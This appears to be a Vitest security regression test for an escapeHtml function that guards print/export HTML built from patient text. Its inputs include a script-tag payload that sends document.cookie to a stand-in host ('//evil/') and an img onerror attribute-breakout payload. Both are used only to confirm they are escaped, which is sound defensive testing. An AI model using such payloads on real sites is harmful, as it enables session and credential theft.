import { describe, it, expect } from 'vitest';
import { escapeHtml } from './html';

// Security regression: every print/export flow interpolates user/PHI text into
// hand-built HTML, so escapeHtml is the XSS gate. These payloads must stay inert.
describe('escapeHtml (print/export XSS gate)', () => {
	it('escapes all five HTML metacharacters', () => {
		expect(escapeHtml(`& < > " '`)).toBe('&amp; &lt; &gt; &quot; &#39;');
	});

	it('neutralises a <script> injection (cookie/JWT exfil payload)', () => {
		const out = escapeHtml('<script>fetch("//evil/?c="+document.cookie)</script>');
		expect(out).not.toContain('<script>');
		expect(out).not.toContain('</script>');
		expect(out).toContain('&lt;script&gt;');
	});

	it('neutralises an attribute-breakout payload (e.g. a patient name in <title>)', () => {
		const out = escapeHtml('"><img src=x onerror=alert(1)>');
		expect(out).not.toContain('<img'); // no live tag survives
		expect(out).not.toContain('">'); // the quote+bracket breakout is escaped
		expect(out).toContain('&quot;&gt;&lt;img');
	});

	it('leaves safe text unchanged', () => {
		expect(escapeHtml('Ryan Adamson')).toBe('Ryan Adamson');
	});
});
